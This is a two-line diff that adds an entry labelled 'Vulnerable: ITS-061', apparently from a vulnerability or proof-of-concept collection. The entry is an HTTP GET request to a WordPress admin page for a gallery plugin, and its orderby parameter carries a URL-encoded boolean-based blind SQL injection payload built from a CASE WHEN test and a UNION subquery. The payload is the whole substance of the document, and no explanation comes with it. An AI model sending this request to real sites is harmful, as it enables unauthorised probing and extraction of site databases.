@@ -1,0 +1,2 @@
+# Vulnerable: ITS-061
+GET /wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7421)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc
